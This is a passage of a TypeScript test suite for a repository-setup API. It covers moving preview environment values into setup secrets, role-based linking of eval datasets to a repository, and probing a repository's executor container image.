        ctx.mockPrisma.repoSetupSecret.create.mockResolvedValue({});
        ctx.mockPrisma.connection.update.mockResolvedValue({});
      });

      it('moves the secret-looking values by default and keeps the rest in env', async () => {
        const res = await move();
        expect(res.statusCode).toBe(200);
        expect(res.json().data).toMatchObject({
          moved: ['API_TOKEN'],
          previewConfig: { env: { PORT: '3000' }, secrets: ['API_TOKEN'] },
        });
      });

      it('refuses a value too short to be a setup secret', async () => {
        const res = await move({ names: ['PORT'] });
        expect(res.statusCode).toBe(400);
        expect(res.json().error.code).toBe('SETUP_SECRET_TOO_SHORT');
        expect(res.body).not.toContain('3000');
        expect(ctx.mockPrisma.repoSetupSecret.create).not.toHaveBeenCalled();
      });

      it('refuses a name the env does not have', async () => {
        const res = await move({ names: ['NOPE'] });
        expect(res.statusCode).toBe(400);
        expect(res.json().error.code).toBe('NOT_IN_PREVIEW_ENV');
      });
    });
  });

  describe('eval datasets using the setup secrets', () => {
    const OTHER_REPO = '44444444-4444-4444-8444-444444444444';
    const DATASET = '55555555-5555-4555-8555-555555555555';
    const ORG_ID = '77777777-7777-4777-8777-777777777777';
    const link = (linked: boolean) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { linked },
        url: `/api/v1/repositories/${REPO_ID}/setup/eval-datasets/${DATASET}`,
      });
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const dataset = (over: Record<string, unknown> = {}) =>
      ctx.mockPrisma.evalDataset.findUnique.mockResolvedValue({
        id: DATASET,
        scope: 'TEAM',
        setupSecretsConnectionId: null,
        teamId: TEAM_ID,
        ...over,
      });

    beforeEach(() => {
      for (const fn of Object.values(ctx.mockPrisma.evalDataset)) {
        fn.mockReset();
      }
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        id: REPO_ID,
        team: { orgId: ORG_ID },
        teamId: TEAM_ID,
        type: 'git_repo',
      });
      ctx.mockPrisma.evalDataset.update.mockResolvedValue({});
      ctx.mockPrisma.organizationMembership.findUnique.mockReset().mockResolvedValue(null);
    });
    const asOrgAdmin = () => {
      asTeamMember('LEAD');
      ctx.mockPrisma.organizationMembership.findUnique.mockResolvedValue({ role: 'ORG_ADMIN' });
    };
    const list = () =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: `/api/v1/repositories/${REPO_ID}/setup/eval-datasets`,
      });

    it("lists only the repository team's TEAM datasets, marking which use this repository", async () => {
      asTeamMember('ADMIN');
      ctx.mockPrisma.evalDataset.findMany.mockResolvedValue([
        {
          id: 'd1',
          name: 'A',
          scope: 'TEAM',
          setupSecretsConnection: { id: REPO_ID, name: 'me' },
          slug: 'a',
        },
        {
          id: 'd2',
          name: 'B',
          scope: 'TEAM',
          setupSecretsConnection: {
            id: OTHER_REPO,
            name: null,
            organizationName: 'acme',
            repoName: 'other',
          },
          slug: 'b',
        },
        { id: 'd3', name: 'C', scope: 'TEAM', setupSecretsConnection: null, slug: 'c' },
      ]);
      const res = await list();
      expect(res.statusCode).toBe(200);
      expect(res.json().data).toEqual([
        { id: 'd1', linked: true, name: 'A', scope: 'TEAM', slug: 'a', usesRepository: null },
        {
          id: 'd2',
          linked: false,
          name: 'B',
          scope: 'TEAM',
          slug: 'b',
          usesRepository: { id: OTHER_REPO, name: 'acme/other' },
        },
        { id: 'd3', linked: false, name: 'C', scope: 'TEAM', slug: 'c', usesRepository: null },
      ]);
      const query = ctx.mockPrisma.evalDataset.findMany.mock.calls[0]?.[0] as {
        where: Record<string, unknown>;
      };
      expect(query.where).toEqual({ scope: 'TEAM', teamId: TEAM_ID });
      expect(ctx.mockPrisma.evalDataset.findMany).toHaveBeenCalledOnce();
    });

    it("lists the organization's ORG datasets to an organization admin who is not a team admin", async () => {
      asOrgAdmin();
      ctx.mockPrisma.evalDataset.findMany.mockResolvedValue([]);
      expect((await list()).statusCode).toBe(200);
      const query = ctx.mockPrisma.evalDataset.findMany.mock.calls[0]?.[0] as {
        where: Record<string, unknown>;
      };
      expect(query.where).toEqual({ orgId: ORG_ID, scope: 'ORGANIZATION' });
      expect(ctx.mockPrisma.evalDataset.findMany).toHaveBeenCalledOnce();
      expect(ctx.mockPrisma.organizationMembership.findUnique).toHaveBeenCalledWith({
        select: { role: true },
        where: { userId_orgId: { orgId: ORG_ID, userId: 'lead-1' } },
      });
    });

    it('lists both scopes to a platform admin', async () => {
      ctx.mockPrisma.evalDataset.findMany.mockResolvedValue([]);
      await list();
      const wheres = ctx.mockPrisma.evalDataset.findMany.mock.calls.map(
        (c) => (c[0] as { where: Record<string, unknown> }).where
      );
      expect(wheres).toEqual([
        { scope: 'TEAM', teamId: TEAM_ID },
        { orgId: ORG_ID, scope: 'ORGANIZATION' },
      ]);
    });

    it("lets an organization admin link the organization's dataset, and audits it", async () => {
      asOrgAdmin();
      dataset({ orgId: ORG_ID, scope: 'ORGANIZATION', teamId: null });
      const res = await link(true);
      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.evalDataset.update).toHaveBeenCalledWith({
        data: { setupSecretsConnectionId: REPO_ID },
        where: { id: DATASET },
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalled();
    });

    it("refuses an organization admin another organization's dataset and the team's datasets", async () => {
      asOrgAdmin();
      dataset({
        orgId: '88888888-8888-4888-8888-888888888888',
        scope: 'ORGANIZATION',
        teamId: null,
      });
      expect((await link(true)).statusCode).toBe(404);
      dataset();
      expect((await link(true)).statusCode).toBe(404);
      expect(ctx.mockPrisma.evalDataset.update).not.toHaveBeenCalled();
    });

    it('refuses an ORG_MEMBER', async () => {
      asTeamMember('LEAD');
      ctx.mockPrisma.organizationMembership.findUnique.mockResolvedValue({ role: 'ORG_MEMBER' });
      dataset({ orgId: ORG_ID, scope: 'ORGANIZATION', teamId: null });
      expect((await link(true)).statusCode).toBe(403);
    });

    it('lets a team admin link a team dataset, replacing another repository, and audits it', async () => {
      asTeamMember('ADMIN');
      dataset({ setupSecretsConnectionId: OTHER_REPO });
      const res = await link(true);
      expect(res.statusCode).toBe(200);
      expect(res.json().data).toEqual({ linked: true });
      expect(ctx.mockPrisma.evalDataset.update).toHaveBeenCalledWith({
        data: { setupSecretsConnectionId: REPO_ID },
        where: { id: DATASET },
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalled();
    });

    it('unlinks only a link to this repository', async () => {
      asTeamMember('ADMIN');
      dataset({ setupSecretsConnectionId: REPO_ID });
      expect((await link(false)).json().data).toEqual({ linked: false });
      expect(ctx.mockPrisma.evalDataset.update).toHaveBeenCalledWith({
        data: { setupSecretsConnectionId: null },
        where: { id: DATASET },
      });
      ctx.mockPrisma.evalDataset.update.mockClear();
      dataset({ setupSecretsConnectionId: OTHER_REPO });
      expect((await link(false)).statusCode).toBe(200);
      expect(ctx.mockPrisma.evalDataset.update).not.toHaveBeenCalled();
    });

    it("refuses another team's or organization's dataset and GLOBAL datasets", async () => {
      dataset({ teamId: '66666666-6666-4666-8666-666666666666' });
      expect((await link(true)).statusCode).toBe(404);
      dataset({ scope: 'GLOBAL', teamId: null });
      expect((await link(true)).statusCode).toBe(404);
      dataset({ orgId: 'org-1', scope: 'ORGANIZATION', teamId: null });
      expect((await link(true)).statusCode).toBe(404);
      expect(ctx.mockPrisma.evalDataset.update).not.toHaveBeenCalled();
    });

    it('refuses a team member who is neither a team nor an organization admin, and lists nothing', async () => {
      asTeamMember('LEAD');
      dataset();
      expect((await link(true)).statusCode).toBe(403);
      const res = await list();
      expect(res.statusCode).toBe(200);
      expect(res.json().data).toEqual([]);
      expect(ctx.mockPrisma.evalDataset.findMany).not.toHaveBeenCalled();
      expect(ctx.mockPrisma.evalDataset.update).not.toHaveBeenCalled();
    });
  });

  describe('POST /api/v1/repositories/:id/executor-image/probe', () => {
    const PROBE_RESULT = {
      checks: [{ detail: 'ok', name: 'git', ok: true, required: true }],
      image: 'node:24-alpine',
      ok: true,
    };

    beforeEach(() => {
      ctx.mockTemporal.probeExecutorImage.mockReset().mockResolvedValue(PROBE_RESULT);
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'ghcr.io/acme/exec:1',
        type: 'git_repo',
      });
    });

    it('probes the repo’s executorImage by default and returns the checks', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data).toEqual(PROBE_RESULT);
      const [workflowId, input] = ctx.mockTemporal.probeExecutorImage.mock.calls[0] as [
        string,
        { image?: string },
      ];
      expect(workflowId).toContain(`executor-image-probe-${REPO_ID}`);
      expect(input).toEqual({ image: 'ghcr.io/acme/exec:1' });
    });

    it('sends no image when the repo has none (the worker resolves its default)', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        type: 'git_repo',
      });
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(ctx.mockTemporal.probeExecutorImage.mock.calls[0]?.[1]).toEqual({
        image: undefined,
      });
    });

    it('hands the worker the detection when no image is named, so it can pick the stack image', async () => {
      const detectedStack = { components: [{ path: '', stacks: ['go'] }], evidence: ['go.mod'] };
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        detectedStack,
        executorImage: null,
        type: 'git_repo',
      });
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(ctx.mockTemporal.probeExecutorImage.mock.calls[0]?.[1]).toEqual({ detectedStack });
    });

    it('does not send the detection when an image is named, by the body or the repository', async () => {
      const detectedStack = { components: [{ path: '', stacks: ['go'] }], evidence: [] };
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        detectedStack,
        executorImage: 'ghcr.io/acme/exec:1',
        type: 'git_repo',
      });
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { image: 'debian:stable-slim' },
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      const calls = ctx.mockTemporal.probeExecutorImage.mock.calls as [
        string,
        { detectedStack?: unknown },
      ][];
      expect(calls).toHaveLength(2);
      for (const [, input] of calls) {
        expect(input.detectedStack).toBeUndefined();
      }
    });

    it('honours an explicit image in the body', async () => {
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { image: 'debian:stable-slim' },
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(ctx.mockTemporal.probeExecutorImage.mock.calls[0]?.[1]).toEqual({
        image: 'debian:stable-slim',
      });
    });

    it('rejects a non-image string', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { image: 'not an image;;' },
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockTemporal.probeExecutorImage).not.toHaveBeenCalled();
    });

    it('is ADMIN only', async () => {
      for (const role of ['LEAD', 'ENGINEER'] as const) {
        ctx.authState.role = role;
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: {},
          url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
        });
        expect(res.statusCode).toBe(403);
      }
      expect(ctx.mockTemporal.probeExecutorImage).not.toHaveBeenCalled();
    });

    it('404s when the repository does not exist', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(null);
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {},
        url: `/api/v1/repositories/${REPO_ID}/executor-image/probe`,
      });
      expect(res.statusCode).toBe(404);
    });
  });
});
